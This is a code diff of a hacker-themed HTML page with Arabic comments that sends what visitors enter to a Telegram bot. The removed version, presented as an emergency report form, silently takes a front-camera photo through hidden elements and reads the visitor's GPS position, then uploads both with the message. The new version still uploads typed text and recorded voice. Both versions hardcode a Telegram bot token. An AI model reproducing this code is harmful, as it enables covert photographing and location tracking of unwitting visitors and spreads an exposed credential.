@@ -3,46 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Emergency Terminal v2.0</title>
+    <title>Hacker Emergency System</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
-        .matrix-box { width: 95%; max-width: 500px; padding: 20px; border: 1px solid #0f0; box-shadow: 0 0 15px #0f0; background: rgba(0, 20, 0, 0.9); border-radius: 5px; }
-        h1 { text-align: center; text-transform: uppercase; letter-spacing: 5px; border-bottom: 1px solid #0f0; padding-bottom: 10px; font-size: 20px; }
-        textarea { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; box-sizing: border-box; margin-top: 10px; outline: none; }
-        .controls { display: flex; gap: 10px; margin: 15px 0; }
-        button { flex: 1; padding: 12px; background: #000; border: 1px solid #0f0; color: #0f0; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: #0f0; color: #000; box-shadow: 0 0 10px #0f0; }
-        button:disabled { border-color: #050; color: #050; cursor: not-allowed; }
-        .terminal { background: #001100; border: 1px solid #050; padding: 10px; font-size: 12px; height: 100px; overflow-y: auto; margin-top: 10px; }
-        .status-line { margin: 2px 0; }
-        .blink { animation: blinker 1s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        #video, #canvas { display: none; }
-        .recording-active { border-color: #f00 !important; color: #f00 !important; box-shadow: 0 0 10px #f00; }
+        /* خلفية الماتريكس المتحركة */
+        body {
+            background-color: black;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: -1;
+        }
+        .container {
+            background: rgba(0, 20, 0, 0.85);
+            padding: 25px;
+            border: 2px solid #00ff00;
+            box-shadow: 0 0 20px #00ff00;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+        h1 { font-size: 22px; text-shadow: 0 0 10px #00ff00; }
+        textarea {
+            width: 100%;
+            height: 80px;
+            background: black;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 10px;
+            box-sizing: border-box;
+            outline: none;
+            margin-bottom: 10px;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 10px;
+            background: black;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .btn:hover { background: #00ff00; color: black; }
+        .btn:disabled { border-color: #004400; color: #004400; }
+        .recording { border-color: red !important; color: red !important; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.5; } }
+        #status { margin-top: 15px; font-weight: bold; }
+        .success-led {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            background-color: #004400;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .led-on { background-color: #00ff00; box-shadow: 0 0 15px #00ff00; }
     </style>
 </head>
 <body>
 
-<div class="matrix-box">
-    <h1>[ SYSTEM_EMERGENCY ]</h1>
-    <p style="font-size: 11px; text-align: center;">> INITIALIZING SECURE PROTOCOL...</p>
+<canvas id="matrix"></canvas>
+
+<div class="container">
+    <h1>[ SYSTEM_OVERRIDE ]</h1>
+    <textarea id="msgInput" placeholder="> ENTER_TEXT_HERE..."></textarea>
     
-    <textarea id="msgInput" placeholder="ENTER MESSAGE..."></textarea>
+    <button id="recBtn" class="btn" onclick="startRec()">🎤 START_RECORDING</button>
+    <button id="stopBtn" class="btn" onclick="stopRec()" style="display:none;">⏹ STOP_AND_SAVE</button>
     
-    <div class="controls">
-        <button id="recordBtn" onclick="toggleRecording()">🎤 REC_VOICE</button>
-        <button id="stopBtn" onclick="stopRecording()" disabled>⏹ STOP</button>
-    </div>
+    <button id="sendBtn" class="btn" onclick="sendData()" style="border-width: 2px; margin-top: 20px;">[ EXECUTE_SEND ]</button>
     
-    <button id="sendBtn" style="width: 100%; border-width: 2px;" onclick="runProtocol()">[ EXECUTE_SEND ]</button>
-    
-    <div class="terminal" id="terminal">
-        <div class="status-line">> SYSTEM READY...</div>
+    <div id="status">
+        <span id="led" class="success-led"></span>
+        <span id="statText">STANDING BY...</span>
     </div>
 </div>
-
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
 
 <script>
 const TOKEN = "8579983010:AAFKblFfzbNYk0bXOY6afuSZg3cIu35nobI";
@@ -52,17 +100,32 @@ let mediaRecorder;
 let audioChunks = [];
 let audioBlob = null;
 
-function log(text, color = "#0f0") {
-    const term = document.getElementById('terminal');
-    const line = document.createElement('div');
-    line.className = "status-line";
-    line.style.color = color;
-    line.innerText = `> ${text}`;
-    term.appendChild(line);
-    term.scrollTop = term.scrollHeight;
-}
+// 1. كود خلفية الماتريكس
+const canvas = document.getElementById('matrix');
+const ctx = canvas.getContext('2d');
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
+const letters = "01010101010101010101010101010101";
+const fontSize = 16;
+const columns = canvas.width / fontSize;
+const drops = Array(Math.floor(columns)).fill(1);
 
-async function toggleRecording() {
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#0F0";
+    ctx.font = fontSize + "px arial";
+    for (let i = 0; i < drops.length; i++) {
+        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+setInterval(drawMatrix, 33);
+
+// 2. كود تسجيل الصوت
+async function startRec() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         mediaRecorder = new MediaRecorder(stream);
@@ -70,82 +133,61 @@ async function toggleRecording() {
         mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
         mediaRecorder.onstop = () => {
             audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-            log("VOICE_DATA_ENCRYPTED", "cyan");
+            updateStatus("VOICE_READY", "cyan");
         };
         mediaRecorder.start();
-        document.getElementById('recordBtn').classList.add('recording-active');
-        document.getElementById('recordBtn').disabled = true;
-        document.getElementById('stopBtn').disabled = false;
-        log("RECORDING_STARTED...", "yellow");
-    } catch (e) { log("MIC_ACCESS_DENIED", "red"); }
+        document.getElementById('recBtn').style.display = 'none';
+        document.getElementById('stopBtn').style.display = 'block';
+        document.getElementById('stopBtn').classList.add('recording');
+        updateStatus("RECORDING...", "red");
+    } catch (e) { updateStatus("MIC_ERROR", "red"); }
 }
 
-function stopRecording() {
+function stopRec() {
     mediaRecorder.stop();
-    document.getElementById('recordBtn').classList.remove('recording-active');
-    document.getElementById('recordBtn').disabled = false;
-    document.getElementById('stopBtn').disabled = true;
-    log("RECORDING_STOPPED");
+    document.getElementById('recBtn').style.display = 'block';
+    document.getElementById('stopBtn').style.display = 'none';
 }
 
-async function runProtocol() {
+function updateStatus(txt, color) {
+    const sText = document.getElementById('statText');
+    const led = document.getElementById('led');
+    sText.innerText = txt;
+    sText.style.color = color;
+    if(txt.includes("SUCCESS")) led.classList.add('led-on');
+    else led.classList.remove('led-on');
+}
+
+// 3. كود الإرسال
+async function sendData() {
     const btn = document.getElementById('sendBtn');
+    const note = document.getElementById('msgInput').value;
     btn.disabled = true;
-    log("STARTING_TRANSFER_PROTOCOL...", "white");
-
-    let photoBlob = null;
-    let loc = "LOC_UNKNOWN";
-
-    // 1. الموقع
-    if (navigator.geolocation) {
-        log("FETCHING_GPS_COORDS...");
-        const pos = await new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null)));
-        if(pos) loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-    }
-
-    // 2. الصورة
-    log("CAPTURING_VISUAL_DATA...");
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1000));
-        const canvas = document.getElementById('canvas');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));
-        stream.getTracks().forEach(t => t.stop());
-        log("VISUAL_DATA_ACQUIRED");
-    } catch(e) { log("CAMERA_FAILED", "red"); }
-
-    const time = new Date().toLocaleString('ar-YE');
-    const note = document.getElementById('msgInput').value || "NO_TEXT_PROVIDED";
-    const caption = `[ EMERGENCY_REPORT ]\n\n📝 MSG: ${note}\n📍 GPS: ${loc}\n⏰ TIME: ${time}\n📱 SYS: MATRIX_V2`;
+    updateStatus("SENDING...", "yellow");
 
     try {
-        // إرسال الصورة والبيانات
-        if (photoBlob) {
-            log("UPLOADING_VISUALS...");
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', photoBlob, 'shot.jpg');
-            fd.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        // إرسال النص
+        if(note.trim() !== "") {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: "📝 رسالة هكر جديدة:\n" + note })
+            });
         }
 
         // إرسال الصوت
         if (audioBlob) {
-            log("UPLOADING_VOICE_STREAM...");
-            const fdA = new FormData();
-            fdA.append('chat_id', CHAT_ID);
-            fdA.append('voice', audioBlob, 'voice.ogg');
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fdA });
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('voice', audioBlob, 'voice.ogg');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
         }
 
-        log("PROTOCOL_COMPLETE_SUCCESS", "#0f0");
-        alert("✔️ تم الاختراق.. عفوًا، تم إرسال البلاغ بنجاح!");
+        updateStatus("SUCCESS_SENT", "#00ff00");
+        document.getElementById('msgInput').value = "";
+        audioBlob = null;
     } catch (err) {
-        log("TRANSFER_FAILED_RETRYING...", "red");
+        updateStatus("SEND_FAILED", "red");
     }
     btn.disabled = false;
 }
